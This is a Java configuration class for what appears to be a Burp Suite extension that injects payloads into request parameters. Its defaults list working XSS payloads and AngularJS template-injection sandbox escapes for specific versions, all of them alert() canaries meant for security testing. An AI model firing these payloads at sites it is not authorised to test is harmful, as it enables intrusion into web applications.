package com.littlespidy.parampayloadinjector.model;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * Created with the help of an AI Agent and littlespidy.
 *
 * Configuration holder for parameter injection modes, encodings, target parameter types,
 * and active payload templates.
 */
public class InjectionConfig {

    public enum InjectionMode {
        REPLACE("Replace parameter value"),
        APPEND("Append to parameter value"),
        PREPEND("Prepend to parameter value");

        private final String display;
        InjectionMode(String display) { this.display = display; }
        public String getDisplay() { return display; }
        @Override public String toString() { return display; }
    }

    public enum EncodingMode {
        AUTO("Auto (URL encode Query/Body, Raw for JSON)"),
        URL_ENCODE("Always URL encode special characters"),
        NONE("Raw (No URL encoding)");

        private final String display;
        EncodingMode(String display) { this.display = display; }
        public String getDisplay() { return display; }
        @Override public String toString() { return display; }
    }

    private InjectionMode injectionMode = InjectionMode.REPLACE;
    private EncodingMode encodingMode = EncodingMode.AUTO;
    private boolean targetUrlParams = true;
    private boolean targetBodyParams = true;
    private boolean targetJsonParams = true;
    private boolean targetCookieParams = false;
    private boolean reflectionDetectionEnabled = true;
    private boolean annotateBurpHistory = true;

    private final List<PayloadTemplate> templates = new CopyOnWriteArrayList<>();
    private final List<Runnable> changeListeners = new CopyOnWriteArrayList<>();

    public InjectionConfig() {
        resetToDefaults();
    }

    public void resetToDefaults() {
        templates.clear();

        // ── XSS Templates ──
        templates.add(new PayloadTemplate("xss-script-tag", "XSS", "Script Tag (Direct)", "<script>alert('{param}')</script>", "Classic unescaped HTML context script injection", true));
        templates.add(new PayloadTemplate("xss-breakout-script", "XSS", "Script Tag (Breakout)", "\"><script>alert('{param}')</script>", "Attribute breakout followed by script tag", true));
        templates.add(new PayloadTemplate("xss-img-onerror", "XSS", "IMG OnError", "\"><img src=x onerror=alert('{param}')>", "Common breakout into an image tag with error event handler", true));
        templates.add(new PayloadTemplate("xss-svg-onload", "XSS", "SVG OnLoad", "'\"><svg/onload=alert('{param}')>", "SVG element with inline load handler", true));
        templates.add(new PayloadTemplate("xss-javascript-uri", "XSS", "JavaScript URI", "javascript:alert('{param}')", "Suitable for href or action attributes", true));
        templates.add(new PayloadTemplate("xss-details-toggle", "XSS", "Details OnToggle", "\"><details open ontoggle=alert('{param}')>", "HTML5 details tag triggering toggle without user interaction", false));

        // ── Angular / AngularJS CSTI Templates ──
        templates.add(new PayloadTemplate("angular-interpolation", "Angular CSTI", "String Interpolation Canary", "{{'{param}'}}", "Evaluates string expression inside Angular interpolation", true));
        templates.add(new PayloadTemplate("angular-math-eval", "Angular CSTI", "Math Expression + Param", "{{7*7}} /* {param} */", "Verifies 49 evaluation while tracking parameter origin", true));
        templates.add(new PayloadTemplate("angular-constructor-alert", "Angular CSTI", "Constructor Sandbox Escape", "{{constructor.constructor('alert(\\'{param}\\')')()}}", "Standard Function constructor sandbox breakout", true));
        templates.add(new PayloadTemplate("angular-16-on-escape", "Angular CSTI", "Angular 1.6+ $on Escape", "{{$on.constructor('alert(\\'{param}\\')')()}}", "Scope $on constructor breakout for AngularJS 1.6+", true));
        templates.add(new PayloadTemplate("angular-158-escape", "Angular CSTI", "AngularJS 1.5.8 Escape", "{{x={'a':1};constructor.constructor('alert(\\'{param}\\')')()}}", "Object prototype escape for AngularJS 1.5.8", false));
        templates.add(new PayloadTemplate("angular-14-eval", "Angular CSTI", "AngularJS 1.4 $eval Escape", "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(\\'{param}\\');//');}}", "Prototype pollution eval escape for AngularJS 1.4", false));

        notifyChange();
    }

    public List<PayloadTemplate> getTemplates() {
        return Collections.unmodifiableList(templates);
    }

    public List<PayloadTemplate> getTemplatesForCategory(String category) {
        List<PayloadTemplate> list = new ArrayList<>();
        for (PayloadTemplate t : templates) {
            if (t.getCategory().equalsIgnoreCase(category)) {
                list.add(t);
            }
        }
        return list;
    }

    public void addTemplate(PayloadTemplate template) {
        templates.add(template);
        notifyChange();
    }

    public void removeTemplate(PayloadTemplate template) {
        templates.remove(template);
        notifyChange();
    }

    public void updateTemplate(PayloadTemplate template) {
        for (int i = 0; i < templates.size(); i++) {
            if (templates.get(i).getId().equals(template.getId())) {
                templates.set(i, template);
                break;
            }
        }
        notifyChange();
    }

    public InjectionMode getInjectionMode() {
        return injectionMode;
    }

    public void setInjectionMode(InjectionMode injectionMode) {
        this.injectionMode = injectionMode;
        notifyChange();
    }

    public EncodingMode getEncodingMode() {
        return encodingMode;
    }

    public void setEncodingMode(EncodingMode encodingMode) {
        this.encodingMode = encodingMode;
        notifyChange();
    }

    public boolean isTargetUrlParams() {
        return targetUrlParams;
    }

    public void setTargetUrlParams(boolean targetUrlParams) {
        this.targetUrlParams = targetUrlParams;
        notifyChange();
    }

    public boolean isTargetBodyParams() {
        return targetBodyParams;
    }

    public void setTargetBodyParams(boolean targetBodyParams) {
        this.targetBodyParams = targetBodyParams;
        notifyChange();
    }

    public boolean isTargetJsonParams() {
        return targetJsonParams;
    }

    public void setTargetJsonParams(boolean targetJsonParams) {
        this.targetJsonParams = targetJsonParams;
        notifyChange();
    }

    public boolean isTargetCookieParams() {
        return targetCookieParams;
    }

    public void setTargetCookieParams(boolean targetCookieParams) {
        this.targetCookieParams = targetCookieParams;
        notifyChange();
    }

    public boolean isReflectionDetectionEnabled() {
        return reflectionDetectionEnabled;
    }

    public void setReflectionDetectionEnabled(boolean reflectionDetectionEnabled) {
        this.reflectionDetectionEnabled = reflectionDetectionEnabled;
        notifyChange();
    }

    public boolean isAnnotateBurpHistory() {
        return annotateBurpHistory;
    }

    public void setAnnotateBurpHistory(boolean annotateBurpHistory) {
        this.annotateBurpHistory = annotateBurpHistory;
        notifyChange();
    }

    public void addChangeListener(Runnable listener) {
        changeListeners.add(listener);
    }

    public void removeChangeListener(Runnable listener) {
        changeListeners.remove(listener);
    }

    private void notifyChange() {
        for (Runnable r : changeListeners) {
            try {
                r.run();
            } catch (Exception ignored) {}
        }
    }
}
